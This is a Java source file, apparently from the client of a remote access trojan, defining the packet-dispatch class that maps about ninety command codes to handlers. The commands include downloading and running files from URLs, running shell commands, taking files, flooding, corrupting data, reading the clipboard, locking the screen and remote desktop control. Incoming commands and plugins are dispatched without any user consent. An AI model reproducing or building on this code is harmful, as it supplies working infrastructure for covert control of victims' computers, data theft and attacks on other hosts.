package com.redpois0n.packets;

import java.util.HashMap;
import java.util.Set;

import com.redpois0n.Plugin;

public abstract class AbstractPacket {

	public static final HashMap<Short, Class<? extends AbstractPacket>> packets = new HashMap<Short, Class<? extends AbstractPacket>>();

	static {
		packets.clear();
		packets.put(/* "MSGBOX" */(short) 10, PacketMSGBOX.class);
		packets.put(/* "DISCONNECT" */(short) 11, PacketDISCONNECT.class);
		packets.put(/* "GETSCREEN" */(short) 12, PacketGETSCREEN.class);
		packets.put(/* "GETSCREENONCE" */(short) 13, PacketGETSCREENONCE.class);
		packets.put(/* "VISITURL" */(short) 14, PacketVISITURL.class);
		packets.put(/* "LISTFILES" */(short) 15, PacketLISTFILES.class);
		packets.put(/* "DELETEFILE" */(short) 16, PacketDELETEFILE.class);
		packets.put(/* "DLRUNURL" */(short) 17, PacketDLRUNURL.class);
		packets.put(/* "UPDATE" */(short) 18, PacketUPDATE.class);
		packets.put(/* "LISTPROCESS" */(short) 19, PacketLISTPROCESS.class);
		packets.put(/* "KILLPROCESS" */(short) 20, PacketKILLPROCESS.class);
		packets.put(/* "GETFILE" */(short) 21, PacketGETFILE.class);
		packets.put(/* "FLOOD" */(short) 22, PacketFLOOD.class);
		packets.put(/* "RUNCMD" */(short) 23, PacketRUNCMD.class);
		packets.put(/* "ENDCMD" */(short) 24, PacketENDCMD.class);
		packets.put(/* "EXEC" */(short) 25, PacketEXEC.class);
		packets.put(/* "EXECP" */(short) 26, PacketEXECP.class);
		packets.put(/* "REFRESHINFO" */(short) 27, PacketREFRESHINFO.class);
		packets.put(/* "SHUTDOWN" */(short) 28, PacketSHUTDOWN.class);
		packets.put(/* "RESTART" */(short) 29, PacketRESTART.class);
		packets.put(/* "LOGOUT" */(short) 30, PacketLOGOUT.class);
		packets.put(/* "SLEEPMODE" */(short) 31, PacketSLEEPMODE.class);
		packets.put(/* "LOCK" */(short) 32, PacketLOCK.class);
		packets.put(/* "GETRAM" */(short) 33, PacketGETRAM.class);
		packets.put(/* "CUSTOMDL" */(short) 34, PacketCUSTOMDL.class);
		packets.put(/* "SCRIPT" */(short) 35, PacketSCRIPT.class);
		packets.put(/* "UNINSTALL" */(short) 36, PacketUNINSTALL.class);
		packets.put(/* "RESTARTC" */(short) 37, PacketRESTARTC.class);
		packets.put(/* "REXEC" */(short) 38, PacketREXEC.class);
		packets.put(/* "VISITURLMUCH" */(short) 39, PacketVISITURLMUCH.class);
		packets.put(/* "THUMBNAIL" */(short) 40, PacketTHUMBNAIL.class);
		packets.put(/* "DIR" */(short) 41, PacketDIR.class);
		packets.put(/* "TAKEFILE" */(short) 42, PacketTAKEFILE.class);
		packets.put(/* "MKDIR" */(short) 43, PacketMKDIR.class);
		packets.put(/* "URLSOUND" */(short) 44, PacketURLSOUND.class);
		packets.put(/* "RECONNECT" */(short) 45, PacketRECONNECT.class);
		packets.put(/* "CMOUSE" */(short) 46, PacketCMOUSE.class);
		packets.put(/* "RNTO" */(short) 47, PacketRNTO.class);
		packets.put(/* "STARTCHAT" */(short) 48, PacketSTARTCHAT.class);
		packets.put(/* "ENDCHAT" */(short) 49, PacketENDCHAT.class);
		packets.put(/* "MC" */(short) 50, PacketMC.class);
		packets.put(/* "CHAT" */(short) 51, PacketCHAT.class);
		packets.put(/* "LOG" */(short) 52, PacketLOG.class);
		packets.put(/* "FIND" */(short) 53, PacketFIND.class);
		packets.put(/* "EFIND" */(short) 54, PacketEFIND.class);
		packets.put(/* "GETHOSTFI" */(short) 55, PacketGETHOSTFI.class);
		packets.put(/* "UHOST" */(short) 56, PacketUHOST.class);
		packets.put(/* "GETUT" */(short) 57, PacketGETUT.class);
		packets.put(/* "NUDGE" */(short) 58, PacketNUDGE.class);
		packets.put(/* "CBOARD" */(short) 59, PacketCBOARD.class);
		packets.put(/* "RD" */(short) 60, PacketRD.class);
		packets.put(/* "JVM" */(short) 61, PacketJVM.class);
		packets.put(/* "IMGP" */(short) 62, PacketIMGP.class);
		packets.put(/* "ZIP" */(short) 63, PacketZIP.class);
		packets.put(/* "MD5" */(short) 64, PacketMD5.class);
		packets.put(/* "BEEP" */(short) 65, PacketBEEP.class);
		packets.put(/* "PIA" */(short) 66, PacketPIA.class);
		packets.put(/* "CPIA" */(short) 67, PacketCPIA.class);
		packets.put(/* "FZ" */(short) 68, PacketFZ.class);
		packets.put(/* "PRINTER" */(short) 69, PacketPRINTER.class);
		packets.put(/* "CORRUPT" */(short) 70, PacketCORRUPT.class);
		packets.put(/* "LISTLAN" */(short) 71, PacketLISTLAN.class);
		packets.put(/* "IPCONFIG" */(short) 72, PacketIPCONFIG.class);
		packets.put(/* "GETPORTS" */(short) 73, PacketGETPORTS.class);
		packets.put(/* "GC" */(short) 74, PacketGC.class);
		packets.put(/* "SESRED" */(short) 75, PacketSESRED.class);
		packets.put(/* "SPEECH" */(short) 76, PacketSPEECH.class);
		packets.put(/* "LISTSER" */(short) 77, PacketLISTSER.class);
		packets.put(/* "LISTSTARTUP" */(short) 78, PacketLISTSTARTUP.class);
		packets.put(/* "REG" */(short) 79, PacketREG.class);
		packets.put(/* "REGC" */(short) 80, PacketREGC.class);
		packets.put(/* "LISTINSTALL" */(short) 81, PacketLISTINSTALL.class);
		packets.put(/* "LISTAD" */(short) 82, PacketLISTAD.class);
		packets.put(/* "SYSINFO" */(short) 83, PacketSYSINFO.class);
		packets.put(/* "SO" */(short) 84, PacketSO.class);
		packets.put(/* "LISTI" */(short) 85, PacketLISTI.class);
		packets.put(/* "GETERRLOG" */(short) 86, PacketGETERRLOG.class);
		packets.put(/* "DELERRLOG" */(short) 87, PacketDELERRLOG.class);
		packets.put(/* "GETSCONFIG" */(short) 88, PacketGETSCONFIG.class);
		packets.put(/* "LOADPLUGINS" */(short) 89, PacketLOADPLUGINS.class);
		packets.put(/* "PROP" */(short) 90, PacketPROP.class);
		packets.put(/* "M" */(short) 91, PacketM.class);
		packets.put(/* "P" */(short) 92, PacketP.class);
		packets.put(/* "R" */(short) 93, PacketR.class);
		packets.put(/* "KP" */(short) 94, PacketKP.class);
		packets.put(/* "KR" */(short) 95, PacketKR.class);
		packets.put(/* "VAR" */(short) 96, PacketVAR.class);
		packets.put(/* "LOCALES" */(short) 97, PacketLOCALES.class);
		packets.put(/* "QUICKDESKTOP" */(short) 98, PacketQUICKDESKTOP.class);
		packets.put(/* "ENC" */(short) 99, PacketENC.class);
	}

	public static final void execute(Short line) {
		try {
			for (Plugin p : Plugin.list) {
				p.methods.get("onpacket").invoke(p.instance, new Object[] { line });
			}

			AbstractPacket packet = null;
			Set<Short> set = packets.keySet();
			for (Short str : set) {
				if (line.equals(str)) {
					packet = packets.get(str).newInstance();
					break;
				}
			}

			if (packet != null) {
				try {
					packet.read(null);
				} catch (Exception ex) {
					throw ex;
				}
			}
		} catch (Exception ex) {
			Exception ex1 = new Exception("Failed to handle packet " + line, ex);
			ex1.printStackTrace();
		}
	}

	public abstract void read(String line) throws Exception;

}
